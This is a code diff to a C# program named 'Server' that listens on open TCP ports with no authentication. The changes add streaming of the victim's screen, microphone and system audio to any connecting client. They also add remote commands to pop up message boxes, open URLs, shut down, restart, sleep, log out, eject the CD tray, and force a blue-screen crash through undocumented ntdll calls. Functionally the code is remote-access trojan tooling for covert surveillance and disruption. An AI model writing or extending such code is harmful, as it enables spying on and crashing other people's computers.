@@ -7,25 +7,43 @@ using System.Text;
 using System.Threading.Tasks;
 using System.Windows.Forms;
 using NAudio.Wave;
-using System.Diagnostics;
-using AForge.Video;
 using AForge.Video.DirectShow;
 using System.Linq;
 using System.Drawing.Imaging;
+using System.Collections.Generic;
+using System.Diagnostics;
+using System.Runtime.InteropServices;
+using System.Security.Cryptography;
 
 namespace Server
 {
     class Program
     {
+
+        [DllImport("winmm.dll")]
+        private static extern int mciSendString(string command, string buffer, int bufferSize, IntPtr hwndCallback);
+
+        [DllImport("ntdll.dll")]
+        public static extern uint RtlAdjustPrivilege(int Privilege, bool bEnablePrivilege, bool IsThreadPrivilege, out bool PreviousValue);
+
+        [DllImport("ntdll.dll")]
+        public static extern uint NtRaiseHardError(uint ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask, IntPtr Parameters, uint ValidResponseOption, out uint Response);
+
+
         static TcpListener screenListener;
         static TcpListener voiceListener;
         static TcpListener cameraListener;
+        static TcpListener speakerListener;
 
         static FilterInfoCollection videoDevices;
         static int currentDeviceIndex = 1;
         static VideoCaptureDevice videoSource;
 
         static bool isScreenSharingPaused = false;
+
+        static bool isMicAudio = false;
+        static bool isSystemAudio = false;
+        static bool isCDTrayOpen = false;
 
         static public int fps = 60;
         static public int compression = 100;
@@ -34,6 +52,8 @@ namespace Server
 
         static async Task Main(string[] args)
         {
+            
+
             screenListener = new TcpListener(IPAddress.Any, 8888);
             screenListener.Start();
             Console.WriteLine("Screen sharing server started.");
@@ -46,10 +66,15 @@ namespace Server
             cameraListener.Start();
             Console.WriteLine("Camera sharing server started.");
 
+            speakerListener = new TcpListener(IPAddress.Any, 8891);
+            speakerListener.Start();
+            Console.WriteLine("Speaker sharing server started.");
+
             Task.WaitAll(
                 AcceptClientsAsync(screenListener, HandleScreenClientAsync),
                 AcceptClientsAsync(voiceListener, HandleVoiceClientAsync),
-                AcceptClientsAsync(cameraListener, HandleCameraClientAsync)
+                //AcceptClientsAsync(cameraListener, HandleCameraClientAsync),
+                AcceptClientsAsync(speakerListener, HandleSpeakerClientAsync)
             );
         }
 
@@ -63,6 +88,7 @@ namespace Server
                     Console.WriteLine("Client connected.");
 
                     _ = handleClient(client);
+
                 }
             }
             catch (Exception ex)
@@ -232,6 +258,7 @@ namespace Server
                     await Task.Delay(-1); // Keep the voice client running until manually stopped
 
                     waveIn.StopRecording();
+                    Console.WriteLine("Stopped capturing audio...");
                 }
             }
             catch (Exception ex)
@@ -243,6 +270,45 @@ namespace Server
                 client.Close();
             }
         }
+
+        private static async Task HandleSpeakerClientAsync(TcpClient client)
+        {
+            try
+            {
+                using (NetworkStream stream = client.GetStream())
+                {
+                    var waveIn = new WasapiLoopbackCapture();
+                    waveIn.WaveFormat = new WaveFormat(44100, 1);
+
+                    waveIn.DataAvailable += (sender, e) =>
+                    {
+                        using (MemoryStream ms = new MemoryStream())
+                        {
+                            ms.Write(BitConverter.GetBytes(e.BytesRecorded), 0, 4);
+                            ms.Write(e.Buffer, 0, e.BytesRecorded);
+                            stream.Write(ms.ToArray(), 0, (int)ms.Length);
+                        }
+                    };
+
+                    waveIn.StartRecording();
+                    Console.WriteLine("Capturing system audio...");
+
+                    await Task.Delay(-1); // Keep the voice client running until manually stopped
+
+                    waveIn.StopRecording();
+                    Console.WriteLine("Stopped capturing system audio...");
+                }
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine($"Error handling speaker client: {ex.Message}");
+            }
+            finally
+            {
+                client.Close();
+            }
+        }
+
 
         private static async Task ReceiveDataFromClientAsync(NetworkStream stream)
         {
@@ -277,6 +343,40 @@ namespace Server
                             }
                         }
 
+                        if (receivedData.StartsWith("msg"))
+                        {
+                            string msgString = receivedData.Substring(3);
+
+                            string[] parts = msgString.Split('|');
+                            if (parts.Length < 2)
+                            {
+                                Console.WriteLine("Invalid format for messagebox. Use: text|title|buttons|icon");
+                                return;
+                            }
+
+                            string text = parts[0];
+                            string title = parts[1];
+                            MessageBoxButtons buttons = MessageBoxButtons.OK;
+                            MessageBoxIcon icon = MessageBoxIcon.None;
+
+                            if (parts.Length > 2 && Enum.TryParse(parts[2], out MessageBoxButtons parsedButtons))
+                            {
+                                buttons = parsedButtons;
+                            }
+                            if (parts.Length > 3 && Enum.TryParse(parts[3], out MessageBoxIcon parsedIcon))
+                            {
+                                icon = parsedIcon;
+                            }
+
+                            MessageBox.Show(text, title, buttons, icon);
+                        }
+
+                        if(receivedData.StartsWith("openweb")) 
+                        {
+                            string url = receivedData.Substring(7);
+                            Process.Start(url);
+                        }
+
 
                         switch (receivedData)
                         {
@@ -302,6 +402,46 @@ namespace Server
                                 isScreenSharingPaused = false;
                                 break;
 
+                            case "micOn":
+                                isMicAudio = true;
+                                break;
+
+                            case "micOff":
+                                isMicAudio = false;
+                                break;
+
+                            case "speakerOn":
+                                isSystemAudio = true;
+                                break;
+
+                            case "speakerOff":
+                                isSystemAudio = false;
+                                break;
+
+                            case "shutdown":
+                                Shutdown();
+                                break;
+
+                            case "restart":
+                                Restart();
+                                break
+                                    ;
+                            case "sleep":
+                                Sleep();
+                                break;
+
+                            case "logout":
+                                Logout();
+                                break;
+
+                            case "togglecd":
+                                CDTray();
+                                break;
+
+                            case "bsod":
+                                BSOD();
+                                break;
+
                             default: break;
                         }
 
@@ -321,35 +461,63 @@ namespace Server
 
         private static async Task SendScreenSharingFramesAsync(NetworkStream stream)
         {
+
+            Bitmap screenshot = null;
+            
+            MemoryStream ms = null;
+            EncoderParameters encoderParams = null;
+            ImageCodecInfo jpegCodec = null;
+
+            int batchSize = 5;
+            List<byte[]> frameBatch = new List<byte[]>();
+
+
             try
             {
                 while (true)
                 {
                     if (!isScreenSharingPaused)
                     {
-                        Bitmap screenshot = CaptureScreen();
+                        screenshot = CaptureScreen();
 
                         byte[] imageData;
-                        using (MemoryStream ms = new MemoryStream())
+                        using (ms = new MemoryStream())
                         {
                             if(compression == 100)
                             {
-                                screenshot.Save(ms, System.Drawing.Imaging.ImageFormat.Bmp);
+                                screenshot.Save(ms, System.Drawing.Imaging.ImageFormat.Jpeg);
                             }
                             else
                             {
-                                var qualityParam = new EncoderParameter(System.Drawing.Imaging.Encoder.Quality, compression); // Adjust quality (1-100)
-                                var jpegCodec = GetEncoder(ImageFormat.Jpeg);
-                                var encoderParams = new EncoderParameters(1);
-                                encoderParams.Param[0] = qualityParam;
 
-                                screenshot.Save(ms, jpegCodec, encoderParams);
+                                await Task.Run(() =>
+                                {
+                                    var qualityParam = new EncoderParameter(System.Drawing.Imaging.Encoder.Quality, compression); // Adjust quality (1-100)
+                                    jpegCodec = GetEncoder(ImageFormat.Jpeg);
+                                    encoderParams = new EncoderParameters(1);
+                                    encoderParams.Param[0] = qualityParam;
+
+                                    screenshot.Save(ms, jpegCodec, encoderParams);
+                                });
+
+
                             }
 
-                            imageData = ms.ToArray();
+                            // Add the frame to the batch
+                            frameBatch.Add(ms.ToArray());
+
+                            if (frameBatch.Count >= batchSize)
+                            {
+                                bool success = await SendFrameBatchAsync(stream, frameBatch);
+                                if (!success)
+                                {
+                                    // If sending fails, break out of the loop
+                                    Console.WriteLine("Client disconnected.");
+                                    break;
+                                }
+                                frameBatch.Clear(); // Reset the batch
+                            }
                         }
-                        SendImageSize(stream, imageData.Length);
-                        SendImageData(stream, imageData);
                     }
 
                     await Task.Delay(1000 / fps);
@@ -363,6 +531,49 @@ namespace Server
             catch (Exception ex)
             {
                 Console.WriteLine($"Error sending screen sharing frames: {ex.Message}");
+            }
+        }
+
+
+        private static async Task<bool> SendFrameBatchAsync(NetworkStream stream, List<byte[]> frameBatch)
+        {
+            try
+            {
+
+                // Serialize the batch
+                using (var batchStream = new MemoryStream())
+                {
+                    // Write the number of frames in the batch
+                    batchStream.Write(BitConverter.GetBytes(frameBatch.Count), 0, sizeof(int));
+
+                    // Write each frame's size and data
+                    foreach (var frame in frameBatch)
+                    {
+                        batchStream.Write(BitConverter.GetBytes(frame.Length), 0, sizeof(int));
+                        batchStream.Write(frame, 0, frame.Length);
+                    }
+
+                    // Send the batch
+                    byte[] batchData = batchStream.ToArray();
+                    await stream.WriteAsync(batchData, 0, batchData.Length);
+                }
+
+                return true; // Success
+            }
+            catch (IOException ex) when (ex.InnerException is SocketException)
+            {
+                Console.WriteLine("Client disconnected while sending frame batch.");
+                return false;
+            }
+            catch (SocketException ex)
+            {
+                Console.WriteLine($"Socket error while sending frame batch: {ex.Message}");
+                return false;
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine($"Error sending frame batch: {ex.Message}");
+                return false;
             }
         }
 
@@ -393,6 +604,53 @@ namespace Server
         {
             return ImageCodecInfo.GetImageDecoders().FirstOrDefault(codec => codec.FormatID == format.Guid);
         }
+
+
+        static void Shutdown()
+        {
+            ProcessStartInfo psi = new ProcessStartInfo("shutdown", "/s /f /t 0");
+            psi.CreateNoWindow = true;
+            psi.UseShellExecute = false;
+            Process.Start(psi);
+        }
+
+
+        static void Restart()
+        {
+            Process.Start(new ProcessStartInfo("shutdown", "/r /t 0") { CreateNoWindow = true, UseShellExecute = false });
+        }
+
+        static void Sleep()
+        {
+            Process.Start(new ProcessStartInfo("rundll32.exe", "powrprof.dll,SetSuspendState 0,1,0") { CreateNoWindow = true, UseShellExecute = false });
+        }
+
+        static void Logout()
+        {
+            Process.Start(new ProcessStartInfo("shutdown", "/l") { CreateNoWindow = true, UseShellExecute = false });
+        }
+
+        static void CDTray()
+        {
+            if (isCDTrayOpen)
+            {
+                mciSendString("set cdaudio door closed", null, 0, IntPtr.Zero);
+                Console.WriteLine("Closing CD tray...");
+            }
+            else
+            {
+                mciSendString("set cdaudio door open", null, 0, IntPtr.Zero);
+                Console.WriteLine("Opening CD tray...");
+            }
+            isCDTrayOpen = !isCDTrayOpen;
+        }
+
+        static void BSOD()
+        {
+            RtlAdjustPrivilege(19, true, false, out bool t1);
+            NtRaiseHardError(0xc0000022, 0, 0, IntPtr.Zero, 6, out uint t2);
+        }
+
 
         static Bitmap CaptureScreen()
         {
